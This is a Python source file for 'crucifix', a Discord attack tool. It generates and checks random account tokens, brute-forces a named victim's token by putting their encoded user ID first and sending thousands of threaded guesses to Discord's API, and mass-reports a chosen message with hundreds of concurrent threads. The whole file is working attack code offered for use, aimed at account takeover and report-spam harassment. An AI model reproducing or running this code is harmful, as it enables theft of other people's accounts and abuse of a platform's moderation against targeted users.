import ctypes
import colorama
import os
import sys
import time
import requests
import string
import random
import os.path
import discord
import string
import requests as req
import datetime
import random
import base64
import os
import threading
import requests
import discord, os, json
from discord.ext import commands
from discord.ext.commands import Bot
from colorama import Fore
from threading import Thread as thr
from os import system, name
COMMANDS = ["1","2","3","4","clear","cls","logout","exit","quit"]
current_path = os.path.dirname(os.path.realpath(__file__))

def crucifix_clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def crucifix_main():
    global newprompt
    newprompt = True
    print("")
    print("")
    crucifix_clear()
    print(f'''\n
            NOW LOADED:{Fore.BLUE}
           {Fore.BLUE} ██████╗██████╗ ██╗   ██╗ ██████╗██╗███████╗██╗██╗  ██╗ 1{Fore.RESET} = TOKENGEN
           {Fore.BLUE}██╔════╝██╔══██╗██║   ██║██╔════╝██║██╔════╝██║╚██╗██╔╝ 2{Fore.RESET} = TOKENCHECK
           {Fore.BLUE}██║     ██████╔╝██║   ██║██║     ██║█████╗  ██║ ╚███╔╝  3{Fore.RESET} = ID-REPORT 
           {Fore.BLUE}██║     ██╔══██╗██║   ██║██║     ██║██╔══╝  ██║ ██╔██╗  4{Fore.RESET} = ID-BRUTE
           {Fore.BLUE}╚██████╗██║  ██║╚██████╔╝╚██████╗██║██║     ██║██╔╝ ██╗ AUTHOR{Fore.RESET}: "s4cial"
            {Fore.BLUE}╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ VERSION{Fore.RESET}: 1.0
        ═══════════════════════════════════════════════════════════════════
         [{Fore.BLUE}1{Fore.RESET}] GENERATOR  | [{Fore.BLUE}2{Fore.RESET}] CHECKER | [{Fore.BLUE}3{Fore.RESET}] ID-PAYLOAD | [{Fore.BLUE}4{Fore.RESET}] ID-BRUTEFORCE
        ═══════════════════════════════════════════════════════════════════''')

def crucifix_generator():
    count = 0
    print(f"[{Fore.BLUE}1{Fore.RESET}] > TOKEN GENERATOR | CHOSEN ")
    cantidad = input(f"[{Fore.BLUE}AMOUNT{Fore.RESET}] > ")
    while int(count)<int(cantidad):
            Generated = "NT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
            f= open(current_path +"/"+str("tokens")+str("")+".txt","a")
            f.write(Generated+"\n")
            print(f"[{Fore.BLUE}TOKEN{Fore.RESET}] > "+ Generated)
            count+=1
            if int(count)==int(cantidad):
                print(f"\n[{Fore.BLUE}TOKENS GENERATED{Fore.RESET}] | CRUCIFIX | S4CIAL")
                print(f"[{Fore.BLUE}TOKENS{Fore.RESET}] SAVED TO > 'TOKENS.TXT'")
                input("ANY KEY TO RETURN >")
                crucifix_main()
            pass
            pass

def crucifix_checker():
    crucifix_main()
    input(f"[{Fore.BLUE}!{Fore.RESET}] CONTINUE? | APPLICATION WILL {Fore.BLUE}BREAK{Fore.RESET} WITHOUT A {Fore.BLUE}TOKENS.TXT{Fore.RESET}")
    with open('tokens.txt', 'r') as f:
        for line in f:
            time.sleep(0)
            token = line.rstrip("\n")
            headers = {
                'Authorization': f'{token}'  
	        }
            src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
            try:
                if src.status_code == 200:
	                print(f"[{Fore.BLUE}VALID TOKEN{Fore.RESET}] >" + token)
                else:
	                print(f"[{Fore.BLUE}INVALID TOKEN{Fore.RESET}] >" + token)
            except Exception:
                print (f"TOKEN-CHECKER [{Fore.BLUE}FAILED{Fore.RESET}] | CHECK INTERNET CONNECTIVITY, OR TRY AGAIN LATER")

def crucifix_idbruteforce():
 TOKEN = input(f"[{Fore.BLUE}T{Fore.RESET}] YOUR TOKEN > ")
 class MyClient(discord.Client):
  async def on_ready(self):
    userid = input(f"[{Fore.BLUE}?{Fore.RESET}] VICTIMS ID > ")

    user = await client.fetch_user(int(userid))
    stamp = user.created_at
    timestamp = str(time.mktime(stamp.timetuple()))
    print(timestamp)
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
    encodedstamp = str(encodedBytes, "utf-8")

    print(f"[{Fore.BLUE}X{Fore.RESET}] BRUTEFORCING > {user}")
    time.sleep(3)
    for i in range(10000):
      thr(target = gen, args = (encodedid, encodedstamp)).start()

 def gen(encodedid, encodedstamp):
  while True:
    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
    token = f"{encodedid}.{second}.{end}"
    headers = {'Content-Type': 'application/json', 'authorization': token}
    url = "https://discordapp.com/api/v6/users/@me/library"
    r = req.get(url, headers=headers)
    if r.status_code == 200:

        print(f'[{Fore.BLUE}T{Fore.RESET}] {token} > {Fore.GREEN}VALID{Fore.RESET}')
        f = open("token.txt", "a")
        f.write(token)
        f.close() 
        exit(0)
    else:
        print(f'[{Fore.BLUE}T{Fore.RESET}] {token} > {Fore.RED}INVALID{Fore.RESET}')
 token = os.environ.get(TOKEN)
 client = MyClient()
 client.run(TOKEN, bot=False,)

def crucifix_idpayload():
    class Main:
        def __init__(self):
            self.GUILD_ID = input(f'[{Fore.BLUE}>{Fore.RESET}] G-ID: ')
            self.CHANNEL_ID = input(f'[{Fore.BLUE}>{Fore.RESET}] C-ID: ')
            self.MESSAGE_ID = input(f'[{Fore.BLUE}>{Fore.RESET}] M-ID: ')
            REASON = input(
            f'\n[{Fore.BLUE}1{Fore.RESET}] ILLEGAL CONTENT\n'
            f'[{Fore.BLUE}2{Fore.RESET}] HARASSMENT\n'
            f'[{Fore.BLUE}3{Fore.RESET}] SPAM/PHISHING\n'
            f'[{Fore.BLUE}4{Fore.RESET}] SELF-HARM\n'
            f'[{Fore.BLUE}5{Fore.RESET}] NSFW\n\n'
            f'[{Fore.BLUE}>{Fore.RESET}] REASON: '
         )

            if REASON.upper() in ('1', 'ILLEGAL CONTENT'):
                self.REASON = 0
            elif REASON.upper() in ('2', 'HARASSMENT'):
                self.REASON = 1
            elif REASON.upper() in ('3', 'SPAM OR PHISHING LINKS'):
                self.REASON = 2
            elif REASON.upper() in ('4', 'SELF-HARM'):
                self.REASON = 3
            elif REASON.upper() in ('5', 'NSFW CONTENT'):
                self.REASON = 4
            else:
                print(f'\n[{Fore.BLUE}!{Fore.RESET}] REASON WAS INVALID')
                input('')

                self.RESPONSES = {
                '401: Unauthorized': f'[{Fore.BLUE}!{Fore.RESET}] INVALID TOKEN',
                'Missing Access': f'[{Fore.BLUE}!{Fore.RESET}] MISSING ACCESS',
                'You need to verify your account in order to perform this action.': '[!] UNVERIFIED'
                }
                self.sent = 0
                self.errors = 0

        def _reporter(self):
            report = requests.post(
            'https://discordapp.com/api/v8/report', json={
                'channel_id': self.CHANNEL_ID,
                'message_id': self.MESSAGE_ID,
                'guild_id': self.GUILD_ID,
                'reason': self.REASON
            }, headers={
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'sv-SE',
                'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
                'Content-Type': 'application/json',
                'Authorization': self.TOKEN
            }
         )
            if (status := report.status_code) == 201:
                self.sent += 1
                print(f'[{Fore.BLUE}!{Fore.RESET}] REPORTED.')
            elif status in (401, 403):
                self.errors += 1
                print(self.RESPONSES[report.json()['message']])
            else:
                self.errors += 1
                print(f'[{Fore.BLUE}!{Fore.RESET}] ERROR: {report.text} | S.C: {status}')

        def _update_title(self):
            while True:
                ctypes.windll.kernel32.SetConsoleTitleW(f"crucifix | discord tools | sent > {self.sent} | errors > {self.errors}")
            time.sleep(0.1)

        def _multi_threading(self):
            threading.Thread(target=self._update_title).start()
            while True:
                if threading.active_count() <= 300:
                    threading.Thread(target=self._reporter).start()

        def setup(self):
            recognized = None
            if os.path.exists(config_json := 'config.json'):
                with open(config_json, 'r') as f:
                    try:
                        data = json.load(f)
                        self.TOKEN = data['dtoken']
                    except (KeyError, json.decoder.JSONDecodeError):
                        recognized = False
                    else:
                        recognized = True
            else:
                recognized = False

            if not recognized:
                self.TOKEN = input('[>] DISCORD TOKEN: ')
                with open(config_json, 'w') as f:
                    json.dump({'dtoken': self.TOKEN}, f)
            print()
            self._multi_threading()
    if __name__ == '__main__':
        main = Main()
        main.setup()

def cmds():
    global newprompt
    if newprompt:
        newprompt = False
        command = input(
            f"   ╔════════════[{Fore.BLUE}<>{Fore.RESET}]\n   ╚═══>{Fore.BLUE}crucifix{Fore.RESET}@user {Fore.BLUE}~{Fore.RESET} ")
    else:
        command = input(
            f"   ╠════════════[{Fore.BLUE}<>{Fore.RESET}]\n   ╚═══>{Fore.BLUE}crucifix{Fore.RESET}@user {Fore.BLUE}~{Fore.RESET} ")
    if command not in COMMANDS:
        print(
            f"   ╠═[{Fore.BLUE}X{Fore.RESET}] {Fore.BLUE}INVALID{Fore.RESET} CMD")
        cmds()
    if command == "1":
        crucifix_generator()
    elif command == "2":
        crucifix_checker()
    elif command == "3":
        crucifix_idpayload()
    elif command == "4":
        crucifix_idbruteforce()
    elif command == "clear":
        crucifix_main()
    elif command == "cls":
        crucifix_main()
    elif command == "exit":
        sys.exit("   ╠═[X] EXITING > GOODBYE.")
    elif command == "quit":
        sys.exit("   ╠═[X] EXITING > GOODBYE.")
    elif command == "logout":
        sys.exit("   ╠═[X] EXITING > GOODBYE.")

crucifix_main()
ctypes.windll.kernel32.SetConsoleTitleW(
    f"crucifix | discord tools | created by social")
while True:
    try:
        cmds()
    except KeyboardInterrupt:
        print('')
        pass